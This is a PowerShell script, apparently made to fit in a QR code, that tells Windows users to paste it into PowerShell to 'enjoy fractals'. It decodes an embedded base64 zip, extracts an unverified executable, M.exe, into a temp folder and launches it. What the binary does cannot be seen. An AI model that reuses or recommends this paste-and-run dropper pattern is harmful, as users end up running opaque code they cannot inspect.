#:: --- Open on Windows PC ---
#:: 1. Copy whole text.
#:: 2. Paste into PowerShell.
#:: 3. Enjoy Fractals!
#:: --------------------------
$d = Join-Path $env:temp 'M_105HDGDL69';
New-Item -ItemType Directory -Path $d -Force | Out-Null;
$z = Join-Path $d 'z.zip';
[io.file]::WriteAllBytes($z, [Convert]::FromBase64String('UEsDBBQAAAAIAAAAIQCDAz7GQQYAAAAMAAAFAAAATS5leGXNFAVYG11yInjs93pD3S1wLoSE2hc+FqdeZGNfSPolu3UkXzVNe+6O1N29xa45zt1dl4NzqffdvNmkOXebMK7vzWNLV74JdACgR2QM4AqoUAR/G3isaeI1E1zI+UT+FY3rE/lVXl/EuiEc8oTrm62N9cFgSLI2iNawHLT6glZnWaW1OdQkzjMac6eACr9SfsAux+InUvjJ7H0nz5G878Qh5LNg78lLxGPEK3yNXh4nlAC4NBoIL/+lH5LwbdBp8jSmOZBLByKYkYlEi2igU5HMEc0ESU5+8qksCmChvzTnLA0DOQCvgX8/bMa6rr/inyeJmyXkW3OS8+aq/PfByq/i7wQ7lNYHm8RAQxhXFRGlPxukgd+H2JfKq3el+Mol1fqZp47pnU49cLRmjWbmCcVMV+BnUPtuBu0fZ3CMsXWD99jtoV+weyOfYz+4uJt9puWV7GzFKLZvjoE1ZQFbptez+ZocBgipnRoRP87vWqviKG5sx98fQXV8ZEeLwSKbmZytlOFGbT1DYZwZjVrZ5AdFVG1r0RZtMeRiKfkZd7zkWXfXNG0R3MmYilSDHuCe8bYe9D3fNQONKLx4tQ6tsz+yLGacgxasqTHvehN2jRvzUY/23kC5nHf+TkbKuKO3KKGZgfaEXW/VcZbNi7gTdoOGU5MVTRaggOdVNkpl41RmVdkUlc3gzI8/73gs7k83KcezHcauXaPVycxycwe5ekDgEy1EnyAorZyxQh4kKC1c8Vrh41SRSVMsXj6bl8+ZtMxQFmMQK5iCcrbiQhkF/e9X3jFgsPUMP8Pk55lsYbKBN/u0HmCwz8K3ES/JjlcbbINH+b6k7B2/0ExljLXd7SM9B/Xod8nw3d7vjM77zNUxaP+M8pkfRzKMPGJZ2y8H+7L/dqGMu19Fy93vkq33OxPzen8vrdSgJmWpGV++26vWiH6H9K/oerdk3f0y9UtmVdbU3mYItq/ZfltZqRSgKNTUKHM4Vy9Dr3wQFS/mvElQ3oYitZD1dXXD9joqhfeLZrp8iQuVNcrIE+SCIqp2g7IahfjPVy25wpf86oT8Nmo6DPHEurWr+Cg4R/WtKtzJ9XG4kxpWuBQvXvkplmGFBbTD0VQ66fgCORaQA7hDWYB0xz0m622Dw7k7vm2OG3YJ6L6J1eA2J/E7ug9f4wu/+11dvy7R+22tLoM/rVh2Wcv3Slu+tmNY37Jnx0/15gNbsNQanKuf7ic6wv8dY1P5S4iP5zTav58/Ud0CTh16IJY9gJ6Ew6Bq9M5xIzHH815o449M+ZQWqzhGxRxzUpbLZBmXcFgzKWmKmjsDsBI9vAzeR1A6tDwcr9ePLP1wvfzuUyQXvFrM8IJKAJT5SLpeQNWvYYWcK+vQoop++iUfd0BQ8tGzq8e880caSFsF5QmqH5qK6k703UFF/WqAu4N/Qtw84zb/fGddv6Z06oYzrrvdbr26oUpl6BFf+atJkzWLWeEcFJLre/Exrky11Cg5qCTfUSHZaeHKTJS7CihnRjrz61hVQAtlfgqVQjXzIdnpRSg/Q7mLSzHKif6Wh8THu1DGp/kZ9Kr/JZmx8dzfwUPjxlfw0F9QtXLlxNOg3A7uoHJ068k5qn6vXxs/qbHo9/MDqXz59/I7CqjRa34/0PF7jbiDTkw7TjYafpi+khepkfP383XpRul85RRa/X/0sVbfwGtRHnqMVxsd4M967SpbD/9+sak3coqQXiB6hugJou8iup/om4i+jegVou8j+iGi3USPEN1OdDPRnUTbkb4sD2AO4npEFyKHzlyAc4g9iG9A/DbiCOITxGcxphV5AHEl4mcRXYgcnieughXj9ueg8Hu2DWjbjLY/B//OOZ6FYtHjCwr1vqAEsAUcYbFeEmt9wabQppLNdjgGTtGtqkI41GgHuIqWiBQObVGt0ANOX2RDvdToLRUjkXqPiDGv0CwRJUfAJwalCrFRggNcf+qeo10W3Fgf8DVhJ3LDeq0rVN/kkMORUNgOTaQtawwF7XBVK4QiUrnsS6XDkLYCJ45IYtgRqI9E+JBwVFfpDW1KDgTVlSUVtkXzmgIBgOeg2CcVB7DHwuTZHKFmnNbXEBCdDoCXJ63OZcWVOIovFATYrqsUA6iUNfhpuiXOZcly/x/wO1BLAQIUABQAAAAIAAAAIQCDAz7GQQYAAAAMAAAFAAAAAAAAAAAAAAAAAAAAAABNLmV4ZVBLBQYAAAAAAQABADMAAABkBgAAAAA='));
Expand-Archive $z $d -Force;
Remove-Item $z -Force;
cd $d;
Start-Process '.\M.exe';
exit;
#There was plenty of space left in this QR code, but this text got longer and longer and longer and longer and longer and longer and longer and longer and longer and longer and longer... so here they are, the last bytes of this QR code. Have a good day!!!
